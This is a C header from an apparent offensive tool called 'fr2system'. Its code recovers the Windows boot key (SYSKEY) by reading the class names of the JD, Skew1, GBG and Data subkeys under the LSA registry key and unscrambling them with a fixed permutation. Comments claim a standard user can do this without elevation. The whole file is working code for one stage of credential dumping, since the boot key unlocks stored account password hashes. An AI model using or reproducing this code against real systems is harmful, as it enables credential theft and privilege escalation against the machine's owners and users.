#pragma once
// fr2system - Boot Key extraction
// Reads boot key from live registry (standard user can do this)
// No elevation required

#include "common.h"

// The boot key is scrambled using this permutation
static const int FR2S_BOOTKEY_PERM[16] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };

static BOOL FR2S_HexStringToBytes(const char* hex, BYTE* out, DWORD maxLen) {
    DWORD len = (DWORD)strlen(hex);
    if (len % 2 != 0 || len / 2 > maxLen) return FALSE;

    for (DWORD i = 0; i < len / 2; i++) {
        unsigned int val;
        if (sscanf(&hex[i * 2], "%2x", &val) != 1) return FALSE;
        out[i] = (BYTE)val;
    }
    return TRUE;
}

// Extract boot key from live HKLM\SYSTEM\CurrentControlSet\Control\Lsa
// This is readable by standard users via RegQueryInfoKeyA class name
static BOOL FR2S_GetBootKey(BYTE bootKey[16]) {
    const wchar_t* keyNames[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    char classData[256] = { 0 };
    DWORD offset = 0;

    HKEY hLsa = NULL;
    DWORD err = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0, KEY_READ, &hLsa);
    if (err != ERROR_SUCCESS) {
        FR2S_Err("Failed to open LSA registry key, error: %d", err);
        return FALSE;
    }

    for (int i = 0; i < 4; i++) {
        HKEY hSubKey = NULL;
        err = RegOpenKeyExW(hLsa, keyNames[i], 0, KEY_QUERY_VALUE, &hSubKey);
        if (err != ERROR_SUCCESS) {
            FR2S_Err("Failed to open LSA subkey %ws, error: %d", keyNames[i], err);
            RegCloseKey(hLsa);
            return FALSE;
        }

        DWORD classLen = sizeof(classData) - offset;
        err = RegQueryInfoKeyA(hSubKey, &classData[offset], &classLen,
            NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        if (err != ERROR_SUCCESS) {
            FR2S_Err("Failed to query LSA subkey class, error: %d", err);
            RegCloseKey(hSubKey);
            RegCloseKey(hLsa);
            return FALSE;
        }
        offset += classLen;
        RegCloseKey(hSubKey);
    }
    RegCloseKey(hLsa);

    if (offset < 32) {
        FR2S_Err("Boot key data too short (%d chars)", offset);
        return FALSE;
    }

    // Convert hex string to bytes
    BYTE rawKey[16] = { 0 };
    if (!FR2S_HexStringToBytes(classData, rawKey, 16)) {
        FR2S_Err("Failed to parse boot key hex string");
        return FALSE;
    }

    // Apply permutation
    for (int i = 0; i < 16; i++) {
        bootKey[i] = rawKey[FR2S_BOOTKEY_PERM[i]];
    }

    return TRUE;
}
